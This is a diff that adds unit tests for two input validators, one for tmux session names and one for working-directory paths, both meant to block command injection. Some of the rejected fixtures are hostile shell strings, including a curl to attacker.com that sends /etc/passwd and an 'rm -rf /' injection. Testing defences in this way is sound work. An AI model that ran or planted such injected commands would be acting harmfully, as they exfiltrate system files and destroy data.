@@ -12,6 +12,8 @@ import {
   validateTaskCreate,
   validateTaskUpdate,
   validateStatusUpdate,
+  validateTmuxSession,
+  validateWorkDir,
   VALID_PRIORITIES,
   VALID_STATUSES,
   VALID_COST_LEVELS,
@@ -455,5 +457,167 @@ describe("validateStatusUpdate — invalid enum values", () => {
     for (const s of VALID_STATUSES) {
       expect(err!.message).toContain(s);
     }
+  });
+});
+
+// ─── validateTmuxSession (RCE-1) ─────────────────────────────────────────────
+
+describe("validateTmuxSession — valid values", () => {
+  it("accepts a simple alphanumeric name", () => {
+    expect(validateTmuxSession("claude")).toBeNull();
+  });
+
+  it("accepts a name with hyphens", () => {
+    expect(validateTmuxSession("claude-agent-1")).toBeNull();
+  });
+
+  it("accepts a name with underscores", () => {
+    expect(validateTmuxSession("claude_agent_1")).toBeNull();
+  });
+
+  it("accepts a name with dots", () => {
+    expect(validateTmuxSession("claude.session.1")).toBeNull();
+  });
+
+  it("accepts a single character", () => {
+    expect(validateTmuxSession("a")).toBeNull();
+  });
+
+  it("accepts exactly 64 characters", () => {
+    expect(validateTmuxSession("a".repeat(64))).toBeNull();
+  });
+});
+
+describe("validateTmuxSession — injection attacks rejected", () => {
+  it("rejects semicolon injection", () => {
+    const err = validateTmuxSession("claude; curl attacker.com/$(cat /etc/passwd)");
+    expect(err).not.toBeNull();
+    expect(err!.field).toBe("tmuxSession");
+  });
+
+  it("rejects semicolon-only injection", () => {
+    expect(validateTmuxSession("claude;evil")).not.toBeNull();
+  });
+
+  it("rejects single-quote injection", () => {
+    expect(validateTmuxSession("claude'")).not.toBeNull();
+  });
+
+  it("rejects double-quote injection", () => {
+    expect(validateTmuxSession('claude"')).not.toBeNull();
+  });
+
+  it("rejects backtick command substitution", () => {
+    expect(validateTmuxSession("claude`id`")).not.toBeNull();
+  });
+
+  it("rejects $() command substitution", () => {
+    expect(validateTmuxSession("claude$(evil)")).not.toBeNull();
+  });
+
+  it("rejects pipe character", () => {
+    expect(validateTmuxSession("claude|evil")).not.toBeNull();
+  });
+
+  it("rejects ampersand", () => {
+    expect(validateTmuxSession("claude&evil")).not.toBeNull();
+  });
+
+  it("rejects spaces", () => {
+    expect(validateTmuxSession("claude session")).not.toBeNull();
+  });
+
+  it("rejects newline", () => {
+    expect(validateTmuxSession("claude\nevil")).not.toBeNull();
+  });
+
+  it("rejects empty string", () => {
+    expect(validateTmuxSession("")).not.toBeNull();
+  });
+
+  it("rejects a value longer than 64 characters", () => {
+    expect(validateTmuxSession("a".repeat(65))).not.toBeNull();
+  });
+
+  it("rejects non-string values", () => {
+    expect(validateTmuxSession(null)).not.toBeNull();
+    expect(validateTmuxSession(undefined)).not.toBeNull();
+    expect(validateTmuxSession(123)).not.toBeNull();
+  });
+});
+
+// ─── validateWorkDir (RCE-2) ──────────────────────────────────────────────────
+
+describe("validateWorkDir — valid values", () => {
+  it("accepts a simple absolute path", () => {
+    expect(validateWorkDir("/home/worker")).toBeNull();
+  });
+
+  it("accepts root", () => {
+    expect(validateWorkDir("/")).toBeNull();
+  });
+
+  it("accepts a path with hyphens and underscores", () => {
+    expect(validateWorkDir("/home/worker-agent_1/project")).toBeNull();
+  });
+
+  it("accepts a path with dots", () => {
+    expect(validateWorkDir("/opt/my.project/v1.2")).toBeNull();
+  });
+
+  it("accepts a path of exactly 255 characters", () => {
+    const longPath = "/" + "a".repeat(254);
+    expect(validateWorkDir(longPath)).toBeNull();
+  });
+});
+
+describe("validateWorkDir — injection attacks rejected", () => {
+  it("rejects semicolon injection", () => {
+    expect(validateWorkDir("/tmp/'; rm -rf / #")).not.toBeNull();
+  });
+
+  it("rejects double-quote injection", () => {
+    expect(validateWorkDir('/legit"; curl attacker.com #')).not.toBeNull();
+  });
+
+  it("rejects single-quote injection", () => {
+    expect(validateWorkDir("/tmp/'evil'")).not.toBeNull();
+  });
+
+  it("rejects backtick command substitution", () => {
+    expect(validateWorkDir("/tmp/`id`")).not.toBeNull();
+  });
+
+  it("rejects $() command substitution", () => {
+    expect(validateWorkDir("/tmp/$(evil)")).not.toBeNull();
+  });
+
+  it("rejects relative paths", () => {
+    expect(validateWorkDir("relative/path")).not.toBeNull();
+    expect(validateWorkDir("./relative")).not.toBeNull();
+    expect(validateWorkDir("../escape")).not.toBeNull();
+  });
+
+  it("rejects a path longer than 255 characters", () => {
+    const tooLong = "/" + "a".repeat(255);
+    expect(validateWorkDir(tooLong)).not.toBeNull();
+  });
+
+  it("rejects spaces in path", () => {
+    expect(validateWorkDir("/home/worker dir")).not.toBeNull();
+  });
+
+  it("rejects pipe character", () => {
+    expect(validateWorkDir("/tmp/evil|cmd")).not.toBeNull();
+  });
+
+  it("rejects newline", () => {
+    expect(validateWorkDir("/tmp/\nevil")).not.toBeNull();
+  });
+
+  it("rejects non-string values", () => {
+    expect(validateWorkDir(null)).not.toBeNull();
+    expect(validateWorkDir(undefined)).not.toBeNull();
+    expect(validateWorkDir(123)).not.toBeNull();
   });
 });
